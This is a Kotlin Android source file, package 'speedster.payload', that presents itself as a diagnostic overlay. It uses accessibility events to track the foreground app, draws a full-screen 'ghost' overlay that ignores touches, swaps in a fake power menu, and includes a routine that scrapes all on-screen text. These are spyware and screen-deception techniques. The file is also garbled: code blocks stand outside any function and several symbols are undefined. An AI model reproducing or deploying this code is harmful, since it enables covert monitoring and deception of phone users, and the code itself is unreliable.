package com.speedster.payload

import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.speedster.DynamicEntry
import java.io.File

class PayloadEntry : DynamicEntry {
    private var isOverlayShowing by mutableStateOf(true)
    private var currentPackage by mutableStateOf("unknown")

    override @Composable fun Render(context: Context, resDir: File) {
        LaunchedEffect(Unit) {
            DynamicEntry.log("📡 Diagnostic Mode: Persistent Wireframe Active")
            
            // Always maintain the ghost config
            DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                alpha = 1.0f
            )

            DynamicEntry.accessibilityInterceptor = { event ->
                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    currentPackage = event.packageName?.toString() ?: "unknown"
                    DynamicEntry.log("🔀 Window: $currentPackage")
                }
            }
        }

        SideEffect {
            DynamicEntry.overlayContent = { DiagnosticWireframe(currentPackage) }
        }

        // Shell UI feedback
        Box(modifier = Modifier.fillMaxSize().background(Color.DarkGray), contentAlignment = androidx.compose.ui.Alignment.Center) {
            Text("DIAGNOSTIC OVERLAY: RUNNING", color = Color.Cyan)
        }
    }

    @Composable
    fun DiagnosticWireframe(pkg: String) {
        Box(
            modifier = Modifier
                .fillMaxSize()
                .border(2.dp, Color.Red.copy(alpha = 0.5f))
                .background(Color.Green.copy(alpha = 0.05f))
        ) {
            Column(modifier = Modifier.padding(20.dp).align(androidx.compose.ui.Alignment.BottomStart)) {
                Text("GHOST_BOUNDARIES: ACTIVE", color = Color.Red, fontSize = 10.sp)
                Text("CURRENT_PKG: $pkg", color = Color.Yellow, fontSize = 10.sp)
            }
        }
    }

        // 3. Update the Global Overlay Slot (Only show if shade is hidden)
        SideEffect {
            if (isOverlayShowing && !isShadeVisible) {
                DynamicEntry.overlayContent = { FakePowerMenu() }
            } else {
                DynamicEntry.overlayContent = null
            }
        }

        // Just a status UI for the Shell screen
        Box(modifier = Modifier.fillMaxSize().background(Color.Black), contentAlignment = androidx.compose.ui.Alignment.Center) {
            Text("Ghost Overlay Status: ${if(isOverlayShowing) "ACTIVE" else "IDLE"}", color = if(isOverlayShowing) Color.Red else Color.Green)
        }
    }

    private fun findTextNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
        if (node == null) return
        
        try {
            val text = node.text?.toString()
            val desc = node.contentDescription?.toString()
            
            if (!text.isNullOrBlank()) results.add(text)
            if (!desc.isNullOrBlank()) results.add(desc)

            for (i in 0 until node.childCount) {
                findTextNodes(node.getChild(i), results)
            }
        } catch (e: Exception) {
            // Node might have become invalid during crawl
        }
    }




}